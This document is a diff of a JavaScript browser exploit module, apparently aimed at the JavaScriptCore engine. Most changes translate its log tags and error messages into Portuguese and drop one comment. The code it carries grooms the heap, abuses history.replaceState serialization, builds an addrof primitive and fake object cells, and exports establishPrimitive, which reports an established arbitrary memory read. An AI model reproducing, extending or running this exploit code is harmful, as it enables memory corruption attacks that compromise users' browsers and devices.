@@ -339,29 +339,24 @@ function ceilingReached() {
 
 function giveUp(reason) {
   stopped = true;
-  emit("CORE-GIVE-UP", `reason=${reason}-attempts=${attemptNumber}`);
+  emit("CORE-DESISTIR", `motivo=${reason}-tentativas=${attemptNumber}`);
   const reject = settleReject;
   settleResolve = null;
   settleReject = null;
   running = false;
   if (reject !== null)
     reject(
-      new Error(`core: gave up after ${attemptNumber} attempts (${reason})`),
+      new Error(`core: desistiu após ${attemptNumber} tentativas (${reason})`),
     );
 }
 
 function failed() {
   if (ceilingReached()) {
-    giveUp("attempt-ceiling");
+    giveUp("limite-de-tentativas-atingido");
     return;
   }
-  // PSPULSE: same hygiene as the safe-retry path below — drop the failed
-  // attempt's carrier/strings/graphs (unreclaimable without a GC) and give
-  // the browser an idle window before the next large allocation. Retrying
-  // after 50ms on top of that garbage OOM-kills constrained browsers.
-  // No exploit logic touched.
   releaseAttemptAllocations();
-  emit("AUTO-RETRY-AFTER-FAILURE", `attempt=${attemptNumber}`);
+  emit("AUTO-RENOVACAO-APOS-FALHA", `tentativa=${attemptNumber}`);
   stopped = false;
   retryScheduled = false;
   setTimeout(() => {
@@ -419,25 +414,25 @@ function scheduleSafeRetry(reason) {
     !attemptPersisted
   ) {
     emit(
-      "AUTO-RETRY-NOT-SCHEDULED",
-      `reason=${reason}` +
-        `-safe=${retrySafe}` +
-        `-candidate-seen=${candidateEverReturned}` +
-        `-candidate-mutated=${candidateMutationStarted}` +
-        `-candidate-state-safe=${candidateStateSafe}` +
-        `-attempt-persisted=${attemptPersisted}`,
+      "AUTO-REPETICAO-NAO-AGENDADA",
+      `motivo=${reason}` +
+        `-seguro=${retrySafe}` +
+        `-candidato-visto=${candidateEverReturned}` +
+        `-candidato-mutado=${candidateMutationStarted}` +
+        `-estado-candidato-seguro=${candidateStateSafe}` +
+        `-tentativa-persistida=${attemptPersisted}`,
     );
     failed();
     return;
   }
   if (ceilingReached()) {
-    giveUp("attempt-ceiling");
+    giveUp("limite-de-tentativas-atingido");
     return;
   }
 
   retryScheduled = true;
   const nextAttempt = attemptNumber + 1;
-  emit("AUTO-RETRY-SCHEDULED", `reason=${reason}-next-attempt=${nextAttempt}`);
+  emit("AUTO-REPETICAO-AGENDADA", `motivo=${reason}-proxima-tentativa=${nextAttempt}`);
   releaseAttemptAllocations();
   setTimeout(
     () => {
@@ -450,11 +445,11 @@ function scheduleSafeRetry(reason) {
         stopped
       ) {
         emit(
-          "AUTO-RETRY-CANCELLED",
-          `reason=${reason}` +
-            `-retry-safe=${retrySafe}` +
-            `-candidate-safe=${candidateStillSafe}` +
-            `-candidate-mutated=${candidateMutationStarted}`,
+          "AUTO-REPETICAO-CANCELADA",
+          `motivo=${reason}` +
+            `-repeticao-segura=${retrySafe}` +
+            `-candidato-seguro=${candidateStillSafe}` +
+            `-candidato-mutado=${candidateMutationStarted}`,
         );
         failed();
         return;
@@ -471,8 +466,8 @@ function finishEarlySafeAttempt(tag, extra, reason) {
   retrySafe = true;
   emit(
     tag,
-    `${extra}-retry-safe=true-candidate-seen=false` +
-      "-candidate-mutated=false",
+    `${extra}-repeticao-segura=true-candidato-visto=false` +
+      "-candidato-mutado=false",
   );
   scheduleSafeRetry(reason);
 }
@@ -555,9 +550,9 @@ function startAttempt() {
       sessionStorage.getItem(attemptKey) === String(attemptNumber);
   } catch {}
   emit(
-    "ATTEMPT-START",
-    `attempt-persisted=${attemptPersisted}` +
-      `-capture-ms=${CAPTURE_DELAY_MS}-compose-ms=${COMPOSE_DELAY_MS}`,
+    "INICIO-TENTATIVA",
+    `tentativa-persistida=${attemptPersisted}` +
+      `-captura-ms=${CAPTURE_DELAY_MS}-composicao-ms=${COMPOSE_DELAY_MS}`,
   );
   try {
     buildAndStoreGraph();
@@ -566,9 +561,9 @@ function startAttempt() {
     prepareAddrof();
   } catch (error) {
     finishEarlySafeAttempt(
-      "SETUP-THREW",
+      "CONFIGURACAO-FALHOU",
       `${error?.name}:${String(error?.message).slice(0, 80)}`,
-      "setup-threw",
+      "falha-na-configuracao",
     );
   }
 }
@@ -596,7 +591,7 @@ function leakScopeObject() {
 function prepareSymbolWrapper(F) {
   leakedScope = leakScopeObject();
   if (leakedScope === undefined || leakedScope === null)
-    throw new Error("scope-not-leaked");
+    throw new Error("escopo-nao-vazado");
 
   for (let i = 0; i < 512; i++) leakedScope[`p${i}`] = i;
   for (let j = 0; j < 8; j++) leakedScope[j] = 1.1 * j;
@@ -637,11 +632,11 @@ function buildFakeHost() {
     targetView[0] !== 0xa5 ||
     typeof nativeTarget !== "function"
   )
-    throw new Error("fake-host-shape-failed");
+    throw new Error("estrutura-fake-host-falhou");
 
   anchorElement = document.createElement("textarea");
-  markerObjectA = { marker: 0x4d41524b, kind: "probe-marker-a" };
-  markerObjectB = { marker: 0x4d41524c, kind: "probe-marker-b" };
+  markerObjectA = { marker: 0x4d41524b, kind: "probador-marcador-a" };
+  markerObjectB = { marker: 0x4d41524c, kind: "probador-marcador-b" };
   holderGuardA = { marker: 0x484f4c44 };
   holderGuardB = { marker: 0x47554152 };
   targetHolder = {
@@ -665,14 +660,14 @@ function buildFakeHost() {
     markerObjectA.marker !== 0x4d41524b ||
     markerObjectB.marker !== 0x4d41524c
   )
-    throw new Error("probe-holder-shape-failed");
+    throw new Error("estrutura-holder-sonda-falhou");
 }
 
 function buildAndStoreGraph() {
-  referenceTarget = { marker: 0x51515151, kind: "serialized-reference" };
+  referenceTarget = { marker: 0x51515151, kind: "referencia-serializada" };
   buildFakeHost();
 
-  emit("SSV-BUILD", `k=${K}-n=${DRAIN_COUNT}`);
+  emit("SSV-CONSTRUIR", `k=${K}-n=${DRAIN_COUNT}`);
   fillerGraph = new Array(0xfffd);
   let pos = 0;
   const huge = 1n << 40n;
@@ -685,11 +680,11 @@ function buildAndStoreGraph() {
   outerGraph[1] = referenceTarget;
   outerGraph[2] = referenceTarget;
   outerGraph[CONTROL_INDEX] = CONTROL_INT;
-  emit("SSV-BUILT", `duplicate-index=${DUPLICATE_INDEX}`);
+  emit("SSV-CONSTRUIDO", `indice-duplicado=${DUPLICATE_INDEX}`);
 
-  emit("SSV-STORE-ENTER", `writer-ref=0x${(0x10000 - K).toString(16)}`);
+  emit("SSV-ARMAZENAR-ENTRADA", `ref-escrita=0x${(0x10000 - K).toString(16)}`);
   history.replaceState(outerGraph, "");
-  emit("SSV-STORED", "fake-host-and-probe-holder-not-serialized");
+  emit("SSV-ARMAZENADO", "fake-host-e-suporte-nao-serializados");
 }
 
 function prepareAddrof() {
@@ -698,16 +693,16 @@ function prepareAddrof() {
     return 7;
   };
 
-  emit("ADDROF-PREP-BEGIN", `slots=${CARRIER_SLOTS}-bytes=${CARRIER_BYTES}`);
+  emit("ADDROF-PREPARAR-INICIO", `slots=${CARRIER_SLOTS}-bytes=${CARRIER_BYTES}`);
   getterCarrier[0] = fakeHost;
   for (let i = 1; i < CARRIER_SLOTS; i++) getterCarrier[i] = 0;
   getterCarrier[1] = targetHolder;
   getterCarrier[2] = fakeHost;
   getterCarrier[3] = targetHolder;
-  emit("ADDROF-CARRIER-DONE", "host-holder-host-holder");
+  emit("ADDROF-TRANSPORTADOR-PRONTO", "host-holder-host-holder");
 
   preparedSymbolObject = prepareSymbolWrapper(getterCarrier);
-  emit("ADDROF-WRAPPER-READY", `wait=${CAPTURE_DELAY_MS}ms`);
+  emit("ADDROF-WRAPPER-PRONTO", `aguarde=${CAPTURE_DELAY_MS}ms`);
 
   setTimeout(runAddrofCapture, CAPTURE_DELAY_MS);
   setTimeout(beginComposition, COMPOSE_DELAY_MS);
@@ -739,7 +734,7 @@ function fillRawCellPointers(backing, pointer) {
     pointerLow > 0xffffffff ||
     pointerLow + pointerHigh * 0x100000000 !== pointer
   )
-    throw new Error("invalid-low48-fake-address");
+    throw new Error("endereco-falso-low48-invalido");
 
   predecessorWords = new Uint32Array(backing);
   for (let i = 0; i < predecessorWords.length; i += 2) {
@@ -754,7 +749,7 @@ function fillRawCellPointers(backing, pointer) {
     predecessorWords[last] !== pointerLow ||
     predecessorWords[last + 1] !== pointerHigh
   )
-    throw new Error("pointer-fill-verification-failed");
+    throw new Error("verificacao-preenchimento-ponteiro-falhou");
 }
 
 function clearPredecessor() {
@@ -1076,7 +1071,7 @@ function loadHistoryCritical() {
 
 function runGroomAndLoad() {
   try {
-    emit("SSV-GROOM-ENTER", `n=${DRAIN_COUNT}`);
+    emit("SSV-PREPARACAO-ENTRADA", `n=${DRAIN_COUNT}`);
     const channel = new MessageChannel();
     channel.port1.close();
     channel.port2.close();
@@ -1101,8 +1096,8 @@ function runGroomAndLoad() {
     keepAlive[keepIndex++] = guard;
     keepAlive[keepIndex++] = predecessor;
     emit(
-      "PREDECESSOR-FILLED",
-      `qwords=${PREDECESSOR_SIZE / 8}` + `-fake=${hex(fakeAddress)}`,
+      "PREDECESSSOR-PREENCHIDO",
+      `qwords=${PREDECESSOR_SIZE / 8}` + `-falso=${hex(fakeAddress)}`,
     );
 
     criticalBarrier(fakeAddress, targetAddress);
@@ -1140,7 +1135,7 @@ function ensureBarrierNode() {
 
 function defaultCriticalBarrier(fake, target) {
   try {
-    const line = `CRITICAL-LOAD-NEXT-fake=${hex(fake)}-target=${hex(target)}`;
+    const line = `CARREGAMENTO-CRITICO-PROXIMO-fake=${hex(fake)}-alvo=${hex(target)}`;
     if (barrierNode !== null) {
       barrierNode.textContent = line;
       void barrierNode.offsetWidth;
@@ -1156,17 +1151,17 @@ function defaultCriticalBarrier(fake, target) {
 function beginComposition() {
   if (captureState === 0) {
     finishEarlySafeAttempt(
-      "ADDROF-NO-RESULT",
-      "capture-task-did-not-finish",
-      "addrof-no-result",
+      "ADDROF-SEM-RESULTADO",
+      "tarefa-de-captura-nao-finalizou",
+      "addrof-sem-resultado",
     );
     return;
   }
   if (captureState < 0) {
     finishEarlySafeAttempt(
-      "ADDROF-THREW",
+      "ADDROF-FALHOU",
       `${captureError?.name}:` + String(captureError?.message).slice(0, 80),
-      "addrof-threw",
+      "addrof-falhou",
     );
     return;
   }
@@ -1185,20 +1180,20 @@ function beginComposition() {
   const fakeChars = copiedLength >= 8 ? copiedLength - 8 : 0;
   const sourceCovered = fakeChars * 2 <= CARRIER_BYTES;
 
-  emit("ADDROF-RETURNED", REVISION);
-  emit("ADDROF-COPY", `chars=${copiedLength}-source-covered=${sourceCovered}`);
+  emit("ADDROF-RETORNADO", REVISION);
+  emit("ADDROF-COPIA", `caracteres=${copiedLength}-fonte-coberta=${sourceCovered}`);
   emit(
-    "ADDROF-POINTERS",
-    `HOST=${hex(a0)}-TARGET=${hex(b0)}` +
-      `-HOST2=${hex(a1)}-TARGET2=${hex(b1)}`,
+    "ADDROF-PONTEIROS",
+    `HOST=${hex(a0)}-ALVO=${hex(b0)}` +
+      `-HOST2=${hex(a1)}-ALVO2=${hex(b1)}`,
   );
 
   if (!(repeated && distinct && plausible && sourceCovered)) {
     finishEarlySafeAttempt(
-      "ADDROF-FAIL",
-      `repeat=${repeated}-distinct=${distinct}` +
-        `-plausible=${plausible}-covered=${sourceCovered}`,
-      "addrof-validation",
+      "ADDROF-FALHA",
+      `repeticao=${repeated}-distinto=${distinct}` +
+        `-plausivel=${plausible}-coberto=${sourceCovered}`,
+      "addrof-validacao",
     );
     return;
   }
@@ -1216,9 +1211,9 @@ function beginComposition() {
     targetAddressLow + targetAddressHigh * 0x100000000 !== targetAddress
   ) {
     finishEarlySafeAttempt(
-      "TARGET-ADDRESS-FAIL",
-      `target=${hex(targetAddress)}`,
-      "target-address",
+      "FALHA-ENDERECO-ALVO",
+      `alvo=${hex(targetAddress)}`,
+      "endereco-alvo",
     );
     return;
   }
@@ -1226,15 +1221,15 @@ function beginComposition() {
   fakeAddress = hostAddress + 0x10;
   if (!plausibleCell(fakeAddress) || fakeAddress - hostAddress !== 0x10) {
     finishEarlySafeAttempt(
-      "FAKE-ADDRESS-FAIL",
+      "FALHA-ENDERECO-FALSO",
       `host=${hex(hostAddress)}`,
-      "fake-address",
+      "endereco-falso",
     );
     return;
   }
   emit(
-    "FAKE-ADDRESS",
-    `host=${hex(hostAddress)}-fake=${hex(fakeAddress)}` + "-delta=0x10",
+    "ENDERECO-FALSO",
+    `host=${hex(hostAddress)}-falso=${hex(fakeAddress)}` + "-delta=0x10",
   );
   runGroomAndLoad();
 }
@@ -1242,73 +1237,73 @@ function beginComposition() {
 function reportComposition() {
   if (compositionState < 0) {
     emit(
-      retrySafe ? "SSV-PLACEMENT-MISS" : "LOAD-THREW",
+      retrySafe ? "SSV-ERRO-POSICIONAMENTO" : "CARREGAMENTO-FALHOU",
       `${compositionError?.name}:` +
         String(compositionError?.message).slice(0, 80),
     );
     if (!retrySafe) failed();
-    else scheduleSafeRetry("placement-throw");
+    else scheduleSafeRetry("erro-posicionamento");
     return;
   }
 
   if (compositionState === 2) {
-    emit("NORMAL-CLONE-MISS", "known-reference-returned=true");
-    scheduleSafeRetry("normal-clone-miss");
+    emit("ERRO-CLONE-NORMAL", "referencia-conhecida-retornada=true");
+    scheduleSafeRetry("erro-clone-normal");
     return;
   }
 
   if (compositionState === 3) {
     emit(
       identityResult === -1
-        ? "CARRIER-IDENTITY-FAIL"
+        ? "FALHA-IDENTIDADE-TRANSPORTADOR"
         : zeroHeaderMiss
-          ? "ZERO-HEADER-MISS"
+          ? "CABECALHO-ZERO-AUSENTE"
           : retrySafe
-            ? "COMPOSITION-LENGTH-MISS"
-            : "VALIDATION-MISMATCH",
-      `rw=${rwHeaderOK}-holder=${holderHeaderOK}` +
-        `-function=${functionHeaderOK}` +
-        `-native-executable=${nativeExecutableHeaderOK}` +
-        `-repeat=${pointersRepeated}-retry-safe=${retrySafe}` +
-        `-identity=${identityResult}` +
+            ? "TAMANHO-COMPOSICAO-AUSENTE"
+            : "INCOMPATIBILIDADE-VALIDACAO",
+      `rw=${rwHeaderOK}-suporte=${holderHeaderOK}` +
+        `-funcao=${functionHeaderOK}` +
+        `-executavel-nativo=${nativeExecutableHeaderOK}` +
+        `-repeticao=${pointersRepeated}-repeticao-segura=${retrySafe}` +
+        `-identidade=${identityResult}` +
         `-hex=${dumpHex(rwHeader, CELL_BYTES)}`,
     );
     if (!retrySafe) failed();
     else
       scheduleSafeRetry(
-        zeroHeaderMiss ? "zero-header-miss" : "composition-length-mismatch",
+        zeroHeaderMiss ? "cabecalho-zero-ausente" : "incompatibilidade-tamanho-composicao",
       );
     return;
   }
 
   if (compositionState === 0) {
-    emit("NO-RESULT", "critical-load-did-not-finish");
+    emit("SEM-RESULTADO", "carregamento-critico-nao-finalizou");
     failed();
     return;
   }
 
   emit(
-    "SSV-RETURNED-CLEARED",
-    `length=${compositionLength}` + "-predecessor-cleared=true",
+    "SSV-RETORNADO-LIMPO",
+    `tamanho=${compositionLength}` + "-predecessor-limpo=true",
   );
   emit(
-    "RW-CARRIER",
+    "TRANSPORTADOR-RW",
     `sid=${hex(profile.carrierSID)}` +
-      `-vector=${hex(rwOriginalVector)}` +
-      `-length=${hex(uint32At(rwHeader, 0x18))}` +
-      `-mode=${hex(profile.carrierMode)}`,
+      `-vetor=${hex(rwOriginalVector)}` +
+      `-tamanho=${hex(uint32At(rwHeader, 0x18))}` +
+      `-modo=${hex(profile.carrierMode)}`,
   );
   emit(
-    "HOLDER",
-    `cell=${hex(targetAddress)}` +
+    "SUPORTE",
+    `celula=${hex(targetAddress)}` +
       `-textarea=${hex(anchorElementAddress)}` +
-      `-markerA=${hex(markerAAddress)}-markerB=${hex(markerBAddress)}`,
+      `-marcadorA=${hex(markerAAddress)}-marcadorB=${hex(markerBAddress)}`,
   );
   emit(
-    "JSC-PROFILE",
+    "PERFIL-JSC",
     `u8=${hex(profile.carrierType)}` +
       `-u8flags=${hex(profile.carrierFlags)}` +
-      `-mode=${hex(profile.carrierMode)}` +
+      `-modo=${hex(profile.carrierMode)}` +
       `-obj=${hex(profile.holderType)}` +
       `-objflags=${hex(profile.holderFlags)}` +
       `-fn=${hex(profile.functionType)}` +
@@ -1316,7 +1311,7 @@ function reportComposition() {
       `-nx=${hex(profile.nativeExecType)}` +
       `-nxflags=${hex(profile.nativeExecFlags)}`,
   );
-  emit("RW-HEADER-HEX", dumpHex(rwHeader, CELL_BYTES));
+  emit("RW-CABECALHO-HEX", dumpHex(rwHeader, CELL_BYTES));
 
   const leakPass =
     rwHeaderOK &&
@@ -1330,11 +1325,11 @@ function reportComposition() {
 
   if (!leakPass) {
     emit(
-      "READ-PRIMITIVE-MISMATCH",
+      "INCOMPATIBILIDADE-PRIMITIVA-LEITURA",
       `rw=${rwHeaderOK}` +
-        `-holder=${holderHeaderOK}-function=${functionHeaderOK}` +
-        `-native=${nativeExecutableHeaderOK}` +
-        `-repeat=${pointersRepeated}-restore=${restoreObserved}`,
+        `-suporte=${holderHeaderOK}-funcao=${functionHeaderOK}` +
+        `-nativo=${nativeExecutableHeaderOK}` +
+        `-repeticao=${pointersRepeated}-restauracao=${restoreObserved}`,
     );
 
     liveCandidate = null;
@@ -1343,8 +1338,8 @@ function reportComposition() {
   }
 
   emit(
-    "READ-PRIMITIVE-PASS",
-    "arbitrary-read-established" + "-firmware-offsets-asserted=none",
+    "PRIMITIVA-LEITURA-SUCESSO",
+    "leitura-arbitraria-estabelecida" + "-offsets-firmware-afirmados=nenhum",
   );
 
   try {
@@ -1365,14 +1360,14 @@ function buildCarrier() {
   return {
     aim(address) {
       if (liveCandidate === null)
-        throw new Error("core.aim: carrier is no longer live");
+        throw new Error("core.aim: transportador não está mais ativo");
       if (!plausibleAddress(address))
-        throw new RangeError(`core.aim: implausible address ${address}`);
+        throw new RangeError(`core.aim: endereço implausível ${address}`);
       aimCarrier(liveCandidate, address);
     },
     restore() {
       if (liveCandidate === null)
-        throw new Error("core.restore: carrier is no longer live");
+        throw new Error("core.restore: transportador não está mais ativo");
       restoreCarrier(liveCandidate);
     },
 
@@ -1425,11 +1420,11 @@ export function establishPrimitive(options) {
   if (fakeReleased)
     return Promise.reject(
       new Error(
-        "core: the fake cell has been released to the real-cell pair -- " +
-          "establishPrimitive cannot run again in this page",
+        "core: a célula falsa foi liberada para o par de células reais -- " +
+          "establishPrimitive não pode ser executado novamente nesta página",
       ),
     );
-  if (running) return Promise.reject(new Error("core: already running"));
+  if (running) return Promise.reject(new Error("core: já está em execução"));
   if (
     typeof BigInt !== "function" ||
     typeof MessageChannel !== "function" ||
@@ -1437,7 +1432,7 @@ export function establishPrimitive(options) {
     typeof history === "undefined" ||
     typeof history.replaceState !== "function"
   )
-    return Promise.reject(new Error("core: unsupported browser"));
+    return Promise.reject(new Error("core: navegador incompatível"));
 
   onEvent = typeof opts.onEvent === "function" ? opts.onEvent : null;
   criticalBarrier =
